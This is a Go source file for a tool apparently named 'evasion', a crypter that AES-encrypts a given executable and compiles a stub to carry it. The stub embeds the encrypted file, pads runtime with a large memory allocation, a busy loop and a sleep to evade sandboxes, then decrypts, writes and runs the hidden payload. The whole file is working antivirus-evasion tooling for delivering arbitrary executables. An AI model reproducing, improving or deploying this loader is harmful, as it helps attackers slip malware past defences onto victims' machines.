package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

var (
	encryptionKey []byte
	err           error
	newFileName   string
)

func main() {
	if len(os.Args) != 2 {
		log.Fatal("Missing arguments\nUsage: ./evasion <file>")
	}
	newFileName = generateRandomString()

	fmt.Println("New file name: ", newFileName)

	encryptionKey, err = generateEncryptionKey()
	if err != nil {
		log.Fatal("Failed to create encryption key: ", err)
	}

	fmt.Println("Encryption key: ", encryptionKey)

	dirPath := "result/"
	if err := createDirectory(dirPath); err != nil {
		log.Fatal("Failed to create directory: ", err)
	}
	if err := copyFilesToResult(dirPath, os.Args[1]); err != nil {
		log.Fatal("Failed to copy files: ", err)
	}
	if err := writeMainGoFile(dirPath, getFinalCode()); err != nil {
		log.Fatal("Failed to create main.go file: ", err)
	}
	if err := compileGoProgram(filepath.Join(dirPath, "main.go")); err != nil {
		log.Fatal("Failed to compile Go program: ", err)
	}
	removeFile(filepath.Join(dirPath, "main.go"), filepath.Join(dirPath, newFileName))
}

func createDirectory(dirPath string) error {
	return os.MkdirAll(dirPath, 0o755)
}

func copyFilesToResult(dirPath string, files ...string) error {
	for _, file := range files {
		if err := copyFile(file, filepath.Join(dirPath, newFileName)); err != nil {
			return err
		}
	}
	return nil
}

func writeMainGoFile(dirPath, mainGoCode string) error {
	return os.WriteFile(filepath.Join(dirPath, "main.go"), []byte(mainGoCode), 0o644)
}

func removeFile(files ...string) {
	for _, file := range files {
		os.Remove(file)
	}
}

func compileGoProgram(goFilePath string) error {
	cmd := exec.Command("go", "build", "-o", "result/result.exe", goFilePath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func getFinalCode() string {
	encryptionKeyString := fmt.Sprintf("%q", string(encryptionKey))
	return fmt.Sprintf(`package main

import (
	"embed"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"time"
)

//go:embed %v
var binData embed.FS
var timeStarted = time.Now()

func main() {
	// Allocate 101MB of memory
	mem := make([]byte, 101*1024*1024)

	// Use the allocated memory to prevent it from being optimized away
	for i := range mem {
		mem[i] = byte(i - (i/256)*256)
	}
	cmd := exec.Command("cmd", "/C", "dir")
	// Set the process's memory to the allocated memory
	cmd.Env = append(os.Environ(), "X="+strconv.Itoa(len(mem)))

	if err := cmd.Run(); err != nil {
		fmt.Println("Failed to execute command:", err)
		return
	}
	
	for i := 0; i < 10000001; i++ {
		_ = i
	}
	time.Sleep(time.Second*3)


	// Extract and execute bin
	binPath := extractFile("%v", binData)
	executeFile(binPath)
	defer removeFile(binPath)
}

func extractFile(fileName string, data embed.FS) string {
	filePath := filepath.Join(fileName)

	file, err := data.Open(filePath)
	if err != nil {
		log.Fatal("Failed to open embedded file: ", err)
	}
	defer file.Close()

	fileContent, err := io.ReadAll(file)
	if err != nil {
		log.Fatal("Failed to read embedded file: ", err)
	}

	// Decrypt the file content
	decryptedContent, err := decryptFile(fileContent)
	if err != nil {
		log.Fatal("Failed to decrypt embedded file: ", err)
	}

	err = os.WriteFile(fileName, decryptedContent, 0o777)
	if err != nil {
		log.Fatal("Failed to extract embedded file: ", err)
	}

	return fileName
}



func executeFile(filePath string) {
    absPath, err := filepath.Abs(filePath)  // Get the absolute path of the executable
    if err != nil {
        log.Fatal("Failed to get absolute path: ", err)
    }

    err = os.Chmod(absPath, 0755)  // Set execution permission to 755
    if err != nil {
        log.Fatal("Failed to set execution permission: ", err)
    }

    cmd := exec.Command(absPath)  // Execute the file using the absolute path
    cmd.Dir = filepath.Dir(absPath)  // Set the working directory to the file's directory
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr

    err = cmd.Run()
    if err != nil {
        log.Fatal("Failed to execute file: ", err)
    }
}



func removeFile(filePath string) {
	err := os.Remove(filePath)
	if err != nil {
		log.Fatal("Failed to remove file: ", err)
	}
}


func decryptFile(encryptedData []byte) ([]byte, error) {

	 if time.Since(timeStarted) < time.Second*3 {
		return nil, fmt.Errorf("Time is less than 101 seconds")
	} 

	// Replace 'encryptionKey' with your own encryption key
	encryptionKey := []byte(%s)

	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(encryptedData) < nonceSize {
		return nil, fmt.Errorf("invalid encrypted data")
	}
	nonce := encryptedData[:nonceSize]
	encryptedData = encryptedData[nonceSize:]

	decryptedData, err := gcm.Open(nil, nonce, encryptedData, nil)
	if err != nil {
		return nil, err
	}

	return decryptedData, nil
}
`, newFileName, newFileName, encryptionKeyString)
}

func copyFile(sourceFile, destinationFile string) error {
	sourceData, err := os.ReadFile(sourceFile)
	if err != nil {
		return err
	}

	// Encrypt the file content
	encryptedData, err := encryptFile(sourceData)
	if err != nil {
		return err
	}

	err = os.WriteFile(destinationFile, encryptedData, 0o777)
	if err != nil {
		return err
	}

	return nil
}

func encryptFile(inputData []byte) ([]byte, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}

	encryptedData := gcm.Seal(nil, nonce, inputData, nil)
	return append(nonce, encryptedData...), nil
}

func generateEncryptionKey() ([]byte, error) {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}
	return key, nil
}

func generateRandomString() string {
	letterBytes := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	minLength := 5
	maxLength := 15

	rand.Seed(time.Now().UnixNano())

	length := rand.Intn(maxLength-minLength+1) + minLength

	b := make([]byte, length)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}

	return string(b) + ".exe"
}
